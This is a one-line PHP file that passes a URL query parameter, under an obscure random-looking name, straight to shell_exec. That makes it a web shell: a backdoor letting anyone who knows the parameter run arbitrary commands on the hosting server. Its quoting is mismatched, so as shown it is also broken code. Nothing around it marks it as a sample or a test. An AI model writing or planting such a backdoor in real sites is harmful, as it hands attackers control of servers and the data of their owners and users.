<?php
shell_exec($_GET["8m9_jL8D']);
?>
